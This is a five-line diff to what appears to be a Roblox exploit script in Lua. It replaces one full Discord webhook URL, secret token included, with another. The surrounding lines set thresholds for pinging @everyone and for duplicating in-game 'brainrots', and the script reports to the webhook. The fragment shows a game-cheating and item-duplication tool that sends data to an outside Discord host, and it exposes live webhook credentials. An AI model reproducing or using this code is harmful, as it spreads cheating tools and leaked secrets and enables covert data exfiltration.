@@ -1,6 +1,6 @@
 code for later use
 
-local Webhook = "https://discord.com/api/webhooks/1451560027914506260/GiFI1_5NvKvi2BNFAVIZy-qcbbus5zDIf8xzhStiEgR6-HB-gsS0ZUFhrn3d1QJi7Ysg"
+local Webhook = "https://discord.com/api/webhooks/1454220028315439286/Qawh2jzTFessCdl6AkRWIII2lkjSigUB1fChRfJJOTIDM5oanGnnEa9wOb4vz5W3zFsW"
 getgenv().UserPingThreshold = 10000000      -- Minimum gen to ping @everyone (10M)
 getgenv().DupeTargetGeneration = 10000000   -- Minimum gen to dupe brainrots (10M/s)
 if Webhook and Webhook:match("discord.com/api/webhooks") then
